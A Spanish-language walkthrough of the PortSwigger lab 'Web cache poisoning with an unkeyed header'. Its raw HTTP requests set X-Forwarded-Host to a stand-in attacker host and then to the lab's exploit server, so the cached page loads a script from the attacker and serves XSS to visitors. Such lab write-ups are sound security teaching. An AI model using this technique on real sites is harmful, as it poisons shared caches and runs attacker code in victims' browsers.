---
description: >-
  https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header
---

# Lab 1: Web cache poisoning with an unkeyed header

Tenemos la siguiente peticion inicial:

```bash
GET / HTTP/2
Host: 0a78005e04586385800458cf00f5005c.web-security-academy.net
Cookie: session=d5rexs2XWUOrHG8Jxhxms8Ojpfg8oeHM
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=0, i

```

Y esto responde:

{% code lineNumbers="true" %}
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 10982

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Web cache poisoning with an unkeyed header</title>
    </head>
    <body>
        <script type="text/javascript" src="//0a78005e04586385800458cf00f5005c.web-security-academy.net/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Web cache poisoning with an unkeyed header</h2>
```
{% endcode %}

Modificamos la peticion adicionando un parametro y una cabecera:

```bash
GET /?cb=1234 HTTP/2
Host: 0a78005e04586385800458cf00f5005c.web-security-academy.net
Cookie: session=d5rexs2XWUOrHG8Jxhxms8Ojpfg8oeHM
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
X-Forwarded-Host: http://atacante.com
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=0, i


```

Y lo anterior respondio asi:

{% code lineNumbers="true" %}
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 21
X-Cache: hit
Content-Length: 10937

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Web cache poisoning with an unkeyed header</title>
    </head>
    <body>
        <script type="text/javascript" src="//atacante.com/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Web cache poisoning with an unkeyed header</h2>
```
{% endcode %}

En la linea 17 se puede apreciar que el dominio agregado en la cabecera `X-Forwarded-Host: http://atacante.com` se esta reflejando dentro de la propiedad src de la etiqueta script.

Tambien otra diferencia importante entre la peticion legitima tenia la siguiente cabecera:

```
X-Cache: miss
```

y la otra peticion tenia esta:

```
X-Cache: hit
```

Por lo anterior modificamos nuestro exploit server:

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Y luego de lo anterior, enviamos la peticion con el dominio de nuestro exploit server:

```bash
GET /?cb=1234 HTTP/2
Host: 0a78005e04586385800458cf00f5005c.web-security-academy.net
Cookie: session=d5rexs2XWUOrHG8Jxhxms8Ojpfg8oeHM
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
X-Forwarded-Host: exploit-0a910058048d63ca804257c6013c0019.exploit-server.net
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=0, i


```

Y la peticion previa responde asi:

{% code lineNumbers="true" %}
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 10984

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Web cache poisoning with an unkeyed header</title>
    </head>
    <body>
        <script type="text/javascript" src="//exploit-0a910058048d63ca804257c6013c0019.exploit-server.net/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Web cache poisoning with an unkeyed header</h2>
```
{% endcode %}

Despues de lo anterior, podemos quitar el parametro y enviar la peticion asi: GET / HTTP/2

De esta manera cuando la victima acceda a la raiz, se le desplegara el XSS:

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
